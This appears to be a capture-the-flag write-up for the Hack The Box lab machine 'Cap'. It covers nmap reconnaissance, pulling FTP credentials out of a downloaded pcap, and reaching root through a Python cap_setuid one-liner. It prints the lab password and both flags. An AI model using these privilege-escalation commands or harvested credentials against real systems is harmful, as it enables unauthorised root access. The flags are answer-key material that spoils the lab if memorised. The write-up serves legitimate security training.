# Introduction

[![Cap](https://www.hackthebox.eu/storage/avatars/70ea3357a2d090af11a0953ec8717e90.png)](https://app.hackthebox.eu/machines/351)

| Point | Description |
| :------:| :------: |
| Name | Cap |
| OS   | Linux  |
| Difficulty Rating| Easy   |
| Release | 05 Jun 2021   |
| IP | 10.10.10.245   |
| Owned | 15 Jun 2021 |

# Short retelling

* Analyze pcap files with wireshark
* Find credentials in ftp's authorization
* Use capabilities of python to get root's shell

# Enumeration

## Nmap

Recon host 10.10.10.245 with nmap. Add cap.htb to /etc/hosts

```
┌──(root💀kali)-[/home/kali/HTB/Cap]
└─# nmap -A -p- --min-rate 500 -T4 10.10.10.245 
Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-15 03:41 EDT
Nmap scan report for cap.htb (10.10.10.245)
Host is up (0.13s latency).
Not shown: 65532 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 fa:80:a9:b2:ca:3b:88:69:a4:28:9e:39:0d:27:d5:75 (RSA)
|   256 96:d8:f8:e3:e8:f7:71:36:c5:49:d5:9d:b6:a4:c9:0c (ECDSA)
|_  256 3f:d0:ff:91:eb:3b:f6:e1:9f:2e:8d:de:b3:de:b2:18 (ED25519)
80/tcp open  http    gunicorn
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 404 NOT FOUND
|     Server: gunicorn
|     Date: Tue, 15 Jun 2021 07:55:50 GMT
|     Connection: close
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 232
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
|     <title>404 Not Found</title>
|     <h1>Not Found</h1>
|     <p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
|   GetRequest: 
|     HTTP/1.0 200 OK
|     Server: gunicorn
|     Date: Tue, 15 Jun 2021 07:55:43 GMT
|     Connection: close
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 19386
|     <!DOCTYPE html>
|     <html class="no-js" lang="en">
|     <head>
|     <meta charset="utf-8">
|     <meta http-equiv="x-ua-compatible" content="ie=edge">
|     <title>Security Dashboard</title>
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <link rel="shortcut icon" type="image/png" href="/static/images/icon/favicon.ico">
|     <link rel="stylesheet" href="/static/css/bootstrap.min.css">
|     <link rel="stylesheet" href="/static/css/font-awesome.min.css">
|     <link rel="stylesheet" href="/static/css/themify-icons.css">
|     <link rel="stylesheet" href="/static/css/metisMenu.css">
|     <link rel="stylesheet" href="/static/css/owl.carousel.min.css">
|     <link rel="stylesheet" href="/static/css/slicknav.min.css">
|     <!-- amchar
|   HTTPOptions: 
|     HTTP/1.0 200 OK
|     Server: gunicorn
|     Date: Tue, 15 Jun 2021 07:55:44 GMT
|     Connection: close
|     Content-Type: text/html; charset=utf-8
|     Allow: OPTIONS, HEAD, GET
|     Content-Length: 0
|   RTSPRequest: 
|     HTTP/1.1 400 Bad Request
|     Connection: close
|     Content-Type: text/html
|     Content-Length: 196
|     <html>
|     <head>
|     <title>Bad Request</title>
|     </head>
|     <body>
|     <h1><p>Bad Request</p></h1>
|     Invalid HTTP Version &#x27;Invalid HTTP Version: &#x27;RTSP/1.0&#x27;&#x27;
|     </body>
|_    </html>
|_http-server-header: gunicorn
|_http-title: Security Dashboard
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port80-TCP:V=7.91%I=7%D=6/15%Time=60C85A28%P=x86_64-pc-linux-gnu%r(GetR
SF:equest,2A94,"HTTP/1\.0\x20200\x20OK\r\nServer:\x20gunicorn\r\nDate:\x20
SF:Tue,\x2015\x20Jun\x202021\x2007:55:43\x20GMT\r\nConnection:\x20close\r\
SF:nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x20193
SF:86\r\n\r\n<!DOCTYPE\x20html>\n<html\x20class=\"no-js\"\x20lang=\"en\">\
SF:n\n<head>\n\x20\x20\x20\x20<meta\x20charset=\"utf-8\">\n\x20\x20\x20\x2
SF:0<meta\x20http-equiv=\"x-ua-compatible\"\x20content=\"ie=edge\">\n\x20\
SF:x20\x20\x20<title>Security\x20Dashboard</title>\n\x20\x20\x20\x20<meta\
SF:x20name=\"viewport\"\x20content=\"width=device-width,\x20initial-scale=
SF:1\">\n\x20\x20\x20\x20<link\x20rel=\"shortcut\x20icon\"\x20type=\"image
SF:/png\"\x20href=\"/static/images/icon/favicon\.ico\">\n\x20\x20\x20\x20<
SF:link\x20rel=\"stylesheet\"\x20href=\"/static/css/bootstrap\.min\.css\">
SF:\n\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\x20href=\"/static/css/fon
SF:t-awesome\.min\.css\">\n\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\x20
SF:href=\"/static/css/themify-icons\.css\">\n\x20\x20\x20\x20<link\x20rel=
SF:\"stylesheet\"\x20href=\"/static/css/metisMenu\.css\">\n\x20\x20\x20\x2
SF:0<link\x20rel=\"stylesheet\"\x20href=\"/static/css/owl\.carousel\.min\.
SF:css\">\n\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\x20href=\"/static/c
SF:ss/slicknav\.min\.css\">\n\x20\x20\x20\x20<!--\x20amchar")%r(HTTPOption
SF:s,B3,"HTTP/1\.0\x20200\x20OK\r\nServer:\x20gunicorn\r\nDate:\x20Tue,\x2
SF:015\x20Jun\x202021\x2007:55:44\x20GMT\r\nConnection:\x20close\r\nConten
SF:t-Type:\x20text/html;\x20charset=utf-8\r\nAllow:\x20OPTIONS,\x20HEAD,\x
SF:20GET\r\nContent-Length:\x200\r\n\r\n")%r(RTSPRequest,121,"HTTP/1\.1\x2
SF:0400\x20Bad\x20Request\r\nConnection:\x20close\r\nContent-Type:\x20text
SF:/html\r\nContent-Length:\x20196\r\n\r\n<html>\n\x20\x20<head>\n\x20\x20
SF:\x20\x20<title>Bad\x20Request</title>\n\x20\x20</head>\n\x20\x20<body>\
SF:n\x20\x20\x20\x20<h1><p>Bad\x20Request</p></h1>\n\x20\x20\x20\x20Invali
SF:d\x20HTTP\x20Version\x20&#x27;Invalid\x20HTTP\x20Version:\x20&#x27;RTSP
SF:/1\.0&#x27;&#x27;\n\x20\x20</body>\n</html>\n")%r(FourOhFourRequest,189
SF:,"HTTP/1\.0\x20404\x20NOT\x20FOUND\r\nServer:\x20gunicorn\r\nDate:\x20T
SF:ue,\x2015\x20Jun\x202021\x2007:55:50\x20GMT\r\nConnection:\x20close\r\n
SF:Content-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x20232\
SF:r\n\r\n<!DOCTYPE\x20HTML\x20PUBLIC\x20\"-//W3C//DTD\x20HTML\x203\.2\x20
SF:Final//EN\">\n<title>404\x20Not\x20Found</title>\n<h1>Not\x20Found</h1>
SF:\n<p>The\x20requested\x20URL\x20was\x20not\x20found\x20on\x20the\x20ser
SF:ver\.\x20If\x20you\x20entered\x20the\x20URL\x20manually\x20please\x20ch
SF:eck\x20your\x20spelling\x20and\x20try\x20again\.</p>\n");
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.91%E=4%D=6/15%OT=21%CT=1%CU=36181%PV=Y%DS=2%DC=T%G=Y%TM=60C85AB
OS:B%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=10E%TI=Z%CI=Z%TS=A)SEQ(SP=1
OS:05%GCD=1%ISR=10E%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M54BST11NW7%O2=M54BST11NW7%O
OS:3=M54BNNT11NW7%O4=M54BST11NW7%O5=M54BST11NW7%O6=M54BST11)WIN(W1=FE88%W2=
OS:FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M54BNNSN
OS:W7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%D
OS:F=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O
OS:=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W
OS:=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%R
OS:IPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 1720/tcp)
HOP RTT       ADDRESS
1   196.14 ms 10.10.16.1
2   91.26 ms  cap.htb (10.10.10.245)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 288.41 seconds
```

Ports 80/http, 22/ssh, 21/ftp are open.

Let's check http://cap.htb

![](https://github.com/Pash3nlee/HackTheBox/raw/main/images/c1.PNG)

And we see *Security Dashboard* and user *Nathan*.

Also we find info about template *Colorlib*

In the section of the website *Security Snapshot (5 Second PCAP + Analysis)* we see information about packets.

![](https://github.com/Pash3nlee/HackTheBox/raw/main/images/c2.PNG)

Clecking *Download* and we get pcap file *9.pcap*, but it is empty.

Ok in url *http://cap.htb/data/9* we see numbers, what will happen if we choose number 1

![](https://github.com/Pash3nlee/HackTheBox/raw/main/images/c3.PNG)

Download pcap file but we don't find any interesting...

Let's select number 0...

![](https://github.com/Pash3nlee/HackTheBox/raw/main/images/c4.PNG)

Oh, it's the biggiest file, let's check it.

And we see authorization session in FTP.

![](https://github.com/Pash3nlee/HackTheBox/raw/main/images/c5.PNG)

We get credentials

```nathan:Buck3tH4TF0RM3!```

Use this creds to authorize in FTP and we get **user.txt**.

```
┌──(root💀kali)-[/home/kali/HTB/Cap]
└─# ftp cap.htb                                                                                                                                                                                                                      130 ⨯
Connected to cap.htb.
220 (vsFTPd 3.0.3)
Name (cap.htb:kali): nathan
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-rw-r--    1 1001     1001          350 Jun 15 08:12 process.sh
drwxr-xr-x    3 1001     1001         4096 Jun 15 06:40 snap
-r--------    1 1001     1001           33 Jun 15 05:49 user.txt
226 Directory send OK.
ftp> get user.txt
local: user.txt remote: user.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for user.txt (33 bytes).
226 Transfer complete.
33 bytes received in 0.00 secs (83.7054 kB/s)
ftp> exit
221 Goodbye.
                                                                                                                                                                                                                                           
┌──(root💀kali)-[/home/kali/HTB/Cap]
└─# cat user.txt      
ae6799d9781344bfe574b4575b3aa767
```

# Privilege Escalation

Using our password to ssh login too.

Upload *linpeas.sh* to cap.htb and run it.

In the report we find way to *Privilege Escalation* with *capabilities*

```
[+] Capabilities
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#capabilities                                                                                                                                                               
Current capabilities:                                                                                                                                                                                                                      
Current: =
CapInh:   0000000000000000
CapPrm:   0000000000000000
CapEff:   0000000000000000
CapBnd:   0000003fffffffff
CapAmb:   0000000000000000

Shell capabilities:
0x0000000000000000=
CapInh:   0000000000000000
CapPrm:   0000000000000000
CapEff:   0000000000000000
CapBnd:   0000003fffffffff
CapAmb:   0000000000000000

Files with capabilities:
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
/usr/bin/ping = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
```

Interesting string

```
Files with capabilities:
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
```

Readind some articles about *Capabilities*...

* https://book.hacktricks.xyz/linux-unix/privilege-escalation/linux-capabilities#cap_setuid
* https://www.hackingarticles.in/linux-privilege-escalation-using-capabilities/
* https://materials.rangeforce.com/tutorial/2020/02/19/Linux-PrivEsc-Capabilities/

And we find out, that *CAP_SETUID* means that it's possible to set the effective user id of the created process.

So with python we can do like this ``` python3 -c 'import os; os.setuid(0); os.system("/bin/bash")' ```

We get **root.txt**

```
nathan@cap:~$ python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
root@cap:~# id
uid=0(root) gid=1001(nathan) groups=1001(nathan)
root@cap:~# cat /root/root.txt 
8c92357e48828a73457bd361809c4b90
```

# Resources

1. https://book.hacktricks.xyz/linux-unix/privilege-escalation/linux-capabilities#cap_setuid
2. https://www.hackingarticles.in/linux-privilege-escalation-using-capabilities/
3. https://materials.rangeforce.com/tutorial/2020/02/19/Linux-PrivEsc-Capabilities/
